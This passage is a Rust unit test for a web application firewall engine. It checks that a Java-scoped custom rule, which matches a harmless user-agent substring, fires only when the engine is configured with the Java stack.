    #[test]
    fn stack_scoped_rules_respect_configured_stacks() {
        // A Java-scoped custom rule must be inactive for an engine built
        // without the Java stack, and active once it is configured.
        let make_rule = || {
            let mut r = CompiledRule::compile(
                "JAVA-ONLY",
                "java-scoped test rule",
                r#"user_agent contains "ozilla""#,
                RuleAction::Block,
                5,
                vec![],
            )
            .unwrap();
            r.stacks = StackSet::JAVA;
            r
        };
        let without_java = WafEngine::new(&WafEngineConfig {
            mode: WafMode::Monitor,
            stacks: StackSet::GENERIC,
            rules: vec![make_rule()],
            ..Default::default()
        });
        let v = without_java.inspect(&req("GET", "/", ""));
        assert!(
            !v.matched_rules.contains(&"JAVA-ONLY".to_string()),
            "java-scoped rule must be inactive without the java stack"
        );

        let with_java = WafEngine::new(&WafEngineConfig {
            mode: WafMode::Monitor,
            stacks: StackSet::GENERIC.union(StackSet::JAVA),
            rules: vec![make_rule()],
            ..Default::default()
        });
        let v = with_java.inspect(&req("GET", "/", ""));
        assert!(v.matched_rules.contains(&"JAVA-ONLY".to_string()));
    }
}
